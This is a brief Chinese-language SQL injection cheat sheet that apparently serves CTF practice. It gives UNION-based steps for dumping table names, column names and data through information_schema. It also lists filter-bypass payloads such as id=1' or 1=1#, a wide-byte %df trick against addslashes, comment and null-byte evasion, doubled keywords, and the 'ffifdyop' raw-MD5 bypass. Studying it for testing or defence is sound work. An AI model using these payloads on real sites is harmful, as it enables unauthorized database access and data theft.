# 1. 查询步骤

1. 获取字段个数，采用`ORDER BY`
1. 查看显示在页面伤的数据，采用`UNION SELECT 1,2,3...`
1. 替换第2步中的数字，获得表信息 `SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA = DATABASE()`
1. 获得列信息，`SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='table_name'`
1. 获得最终数据，`SELECT GROUP_CONCAT(field1, field2,...) from table_name`

# 2. 注入Tips

1. 单引号绕过，`id=1' or 1=1#`
1. 宽字节绕过，用于结合addslashses()之后单引号前的\，`id=1%df' or 1=1#`
1. /**/绕过空格过滤
1. %00绕过关键词过滤
1. 有xss过滤的考虑用<>绕过关键词过滤
1. `ffifdyop` md5后`276f722736c95d99e921722cf9ed621c`转换成字符串为`'or'6<其他字符>`
1. 只过滤一次关键字的可以采用双写绕过，如`SELSELECTECT`
1. 只把'逃逸成/'的情况可以加/来结合